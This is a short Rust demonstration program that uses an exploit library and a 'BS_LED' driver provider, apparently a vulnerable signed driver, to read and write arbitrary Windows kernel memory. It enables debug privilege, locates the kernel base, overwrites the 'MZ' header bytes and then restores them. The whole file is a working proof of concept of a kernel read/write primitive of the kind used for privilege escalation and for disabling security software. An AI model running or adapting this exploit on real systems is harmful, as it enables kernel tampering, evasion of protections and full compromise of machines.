use providers::bsled::BsLed64;
use vdem::{
    exploit::Exploit, nt::get_kernelbase, traits::ReadWriteVirtualMemory,
    utils::promote_privilege_to_debug_level,
};
fn main() {
    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance()
        .lock()
        .expect("Can not get exploit instance");

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit
        .select("BS_LED")
        .expect("Can not select provider BS_LED");

    let kernel_base = get_kernelbase().expect("Can not get kernel base address");

    let mut buffer = vec![0u8; 4];

    exploit
        .read_kmem(kernel_base as _, &mut buffer)
        .inspect(|_| {
            println!(
                "Successfully read 4 bytes from {:x}: {:?}",
                kernel_base, buffer
            )
        })
        .expect("Can not read from memory {kernel_base:x}");

    // change the buffer
    buffer[0] = 0x5A;
    buffer[1] = 0x5A;

    exploit
        .write_kmem(kernel_base as _, &buffer)
        .inspect(|_| println!("Successfully write 4 bytes to {:x}", kernel_base))
        .expect("Can not write to memory {kernel_base:x}");

    exploit
        .read_kmem(kernel_base as _, &mut buffer)
        .inspect(|_| {
            println!(
                "The first 4 bytes at {:x} is now: {:?}",
                kernel_base, buffer
            )
        })
        .expect("Can not read from memory {kernel_base:x}");

    // Resotre the original sequence
    buffer[0] = b'M';
    buffer[1] = b'Z';

    exploit
        .write_kmem(kernel_base as _, &buffer)
        .inspect(|_| println!("Restore original bytes at {:x}", kernel_base))
        .expect("Can not write to memory {kernel_base:x}");
}
